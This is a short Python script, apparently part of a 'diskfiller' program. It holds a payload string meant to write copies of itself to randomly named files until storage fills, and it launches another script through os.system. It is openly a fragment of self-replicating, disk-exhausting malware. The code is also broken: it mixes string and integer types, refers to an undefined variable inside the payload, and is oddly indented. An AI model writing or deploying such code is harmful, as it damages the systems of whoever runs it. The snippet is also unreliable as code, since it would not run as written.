###Required for diskfiller to run.
import os


def Payload():
   code = ("""
        
  from random import randint

  random_int = randint(0, 10000)
        
  f = open("diskfiller" + (random_int) + ".py", "w")
  f.write(code)
  f.close()



  
        
        
        
  """)
   os.system("python extras.py")